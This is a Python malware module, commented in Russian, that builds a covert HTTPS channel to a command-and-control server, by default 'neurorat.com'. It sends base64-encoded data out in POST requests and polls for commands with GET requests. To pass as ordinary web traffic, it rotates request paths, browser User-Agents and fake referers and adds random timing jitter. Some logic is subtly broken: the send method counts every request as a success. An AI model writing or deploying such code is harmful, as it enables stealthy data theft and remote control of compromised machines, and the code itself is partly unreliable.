#!/usr/bin/env python3
"""
HTTPS Tunnel Module - Модуль для скрытой передачи данных через HTTPS-запросы
Обеспечивает двусторонний канал связи с C2-сервером, маскируясь под обычный веб-трафик
"""

import os
import ssl
import json
import time
import uuid
import random
import base64
import logging
import urllib.request
import urllib.error
import http.client
import threading
import socket
from typing import Dict, List, Any, Optional, Tuple, Union, Callable

class HTTPSTunnel:
    """
    Класс для реализации HTTPS-туннелирования
    Позволяет передавать данные, маскируя их под обычный HTTPS-трафик
    """
    
    def __init__(
        self,
        c2_host: str = "neurorat.com",
        c2_port: int = 443,
        paths: List[str] = None,
        user_agents: List[str] = None,
        poll_interval: float = 5.0,
        jitter: float = 0.3,
        max_chunk_size: int = 1024,
        callback: Optional[Callable[[bytes], None]] = None
    ):
        """
        Инициализация HTTPS-туннеля
        
        Args:
            c2_host: Хост C2-сервера
            c2_port: Порт C2-сервера
            paths: Список валидных путей для маскировки запросов
            user_agents: Список User-Agent для имитации разных браузеров
            poll_interval: Интервал между запросами (секунды)
            jitter: Случайное отклонение для интервала (доля от интервала)
            max_chunk_size: Максимальный размер чанка для передачи
            callback: Колбэк для обработки полученных данных
        """
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.paths = paths or [
            "/",
            "/news",
            "/article",
            "/blog",
            "/images",
            "/api/v1/data",
            "/static/js/main.js",
            "/css/style.css",
            "/favicon.ico",
        ]
        
        self.user_agents = user_agents or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        
        self.poll_interval = poll_interval
        self.jitter = jitter
        self.max_chunk_size = max_chunk_size
        self.callback = callback
        
        self.is_running = False
        self.receive_thread = None
        self.session_id = str(uuid.uuid4())
        self.sequence = 0
        
        # Настройка логирования
        self.logger = logging.getLogger("https_tunnel")
        
        # Счетчики и статистика
        self.stats = {
            "sent_bytes": 0,
            "received_bytes": 0,
            "sent_requests": 0,
            "failed_requests": 0,
            "last_seen": 0
        }
    
    def start(self) -> bool:
        """Запускает HTTPS-туннель"""
        if self.is_running:
            return False
            
        self.is_running = True
        self.receive_thread = threading.Thread(
            target=self._receive_loop,
            daemon=True,
            name="HTTPS-Tunnel-Receiver"
        )
        self.receive_thread.start()
        
        self.logger.info(f"HTTPS-туннель запущен с сессией {self.session_id}")
        return True
    
    def stop(self) -> None:
        """Останавливает HTTPS-туннель"""
        self.is_running = False
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=3)
        
        self.logger.info("HTTPS-туннель остановлен")
    
    def send(self, data: bytes) -> bool:
        """
        Отправляет данные через HTTPS-туннель
        
        Args:
            data: Бинарные данные для отправки
            
        Returns:
            bool: Успешность операции
        """
        # Подготавливаем данные для отправки
        encoded_data = base64.b64encode(data).decode()
        
        # Формируем JSON с данными
        payload = {
            "session_id": self.session_id,
            "sequence": self.sequence,
            "timestamp": time.time(),
            "type": "data",
            "data": encoded_data
        }
        
        # Преобразуем в JSON и отправляем
        json_data = json.dumps(payload)
        
        try:
            # Выбираем случайный путь и user-agent для маскировки
            path = random.choice(self.paths)
            user_agent = random.choice(self.user_agents)
            
            # Отправляем HTTP-запрос
            success = self._send_https_request(
                method="POST", 
                path=path, 
                data=json_data, 
                headers={
                    "User-Agent": user_agent,
                    "Content-Type": "application/json",
                    "X-Session-ID": self.session_id
                }
            )
            
            if success:
                self.stats["sent_bytes"] += len(data)
                self.stats["sent_requests"] += 1
                self.sequence += 1
                return True
            else:
                self.stats["failed_requests"] += 1
                return False
                
        except Exception as e:
            self.logger.error(f"Ошибка при отправке HTTPS-запроса: {e}")
            self.stats["failed_requests"] += 1
            return False
    
    def _send_https_request(
        self, 
        method: str, 
        path: str, 
        data: str = None, 
        headers: Dict[str, str] = None
    ) -> Tuple[bool, Optional[bytes]]:
        """
        Отправляет HTTPS-запрос к C2-серверу
        
        Args:
            method: HTTP-метод (GET, POST)
            path: Путь на сервере
            data: Данные для отправки (для POST)
            headers: HTTP-заголовки
            
        Returns:
            Tuple[bool, Optional[bytes]]: Успешность и полученные данные
        """
        try:
            # Создаем контекст SSL для проверки сертификата
            ssl_context = ssl.create_default_context()
            
            # Настраиваем параметры соединения
            conn = http.client.HTTPSConnection(
                host=self.c2_host,
                port=self.c2_port,
                timeout=10
            )
            
            # Подготавливаем заголовки
            headers = headers or {}
            
            # Добавляем случайные заголовки для лучшей маскировки
            if random.random() < 0.7:  # 70% шанс добавить Accept
                headers["Accept"] = "application/json, text/plain, */*"
            
            if random.random() < 0.5:  # 50% шанс добавить Referer
                referers = [
                    f"https://{self.c2_host}/",
                    f"https://{self.c2_host}/news",
                    f"https://www.google.com/search?q={self.c2_host}"
                ]
                headers["Referer"] = random.choice(referers)
            
            # Отправляем запрос
            if method == "POST" and data:
                conn.request(method, path, body=data, headers=headers)
            else:
                conn.request(method, path, headers=headers)
            
            # Получаем ответ
            response = conn.getresponse()
            response_data = response.read()
            
            # Проверяем статус
            if response.status == 200:
                return True, response_data
            else:
                self.logger.warning(f"Неуспешный HTTP-статус: {response.status}")
                return False, None
        
        except Exception as e:
            self.logger.error(f"Ошибка HTTPS-запроса: {e}")
            return False, None
        
        finally:
            # Закрываем соединение
            if 'conn' in locals():
                conn.close()
    
    def _receive_loop(self) -> None:
        """Цикл приема данных через HTTPS-туннель"""
        while self.is_running:
            try:
                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.poll_interval * self.jitter * random.uniform(-1, 1)
                time.sleep(max(0.1, self.poll_interval + jitter_value))
                
                # Выбираем случайный путь и user-agent для опроса
                path = f"{random.choice(self.paths)}?session={self.session_id}&t={int(time.time())}"
                user_agent = random.choice(self.user_agents)
                
                # Отправляем GET-запрос для получения данных
                success, response_data = self._send_https_request(
                    method="GET",
                    path=path,
                    headers={
                        "User-Agent": user_agent,
                        "X-Session-ID": self.session_id
                    }
                )
                
                if success and response_data:
                    try:
                        # Пытаемся декодировать JSON-ответ
                        response_json = json.loads(response_data.decode())
                        
                        # Проверяем, есть ли данные для этой сессии
                        if (response_json.get("session_id") == self.session_id and 
                            response_json.get("type") == "data" and 
                            "data" in response_json):
                            
                            # Декодируем base64
                            decoded_data = base64.b64decode(response_json["data"])
                            
                            # Обновляем статистику
                            self.stats["received_bytes"] += len(decoded_data)
                            self.stats["last_seen"] = time.time()
                            
                            # Вызываем колбэк для обработки полученных данных
                            if self.callback:
                                self.callback(decoded_data)
                    
                    except json.JSONDecodeError:
                        # Ошибка декодирования JSON, возможно, это не данные для нас
                        pass
                    except Exception as e:
                        self.logger.error(f"Ошибка обработки данных: {e}")
            
            except Exception as e:
                self.logger.error(f"Ошибка в цикле приема: {e}")
                time.sleep(self.poll_interval)  # Продолжаем попытки
    
    def get_statistics(self) -> Dict[str, Any]:
        """Возвращает текущую статистику работы туннеля"""
        # Добавляем текущие параметры
        stats = self.stats.copy()
        stats["is_running"] = self.is_running
        stats["session_id"] = self.session_id
        stats["sequence"] = self.sequence
        stats["uptime"] = time.time() - self.stats.get("start_time", time.time())
        
        return stats

# Тестирование модуля
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    def data_callback(data: bytes) -> None:
        print(f"Получены данные: {data}")
    
    # Используем публичный сервис для тестирования
    tunnel = HTTPSTunnel(
        c2_host="httpbin.org",  # Тестовый сервис
        c2_port=443,
        callback=data_callback
    )
    
    tunnel.start()
    
    try:
        # Отправляем тестовое сообщение
        tunnel.send(b"Hello from HTTPS tunnel!")
        time.sleep(10)  # Даем время на обработку
        
        # Выводим статистику
        print(json.dumps(tunnel.get_statistics(), indent=2))
    finally:
        tunnel.stop() 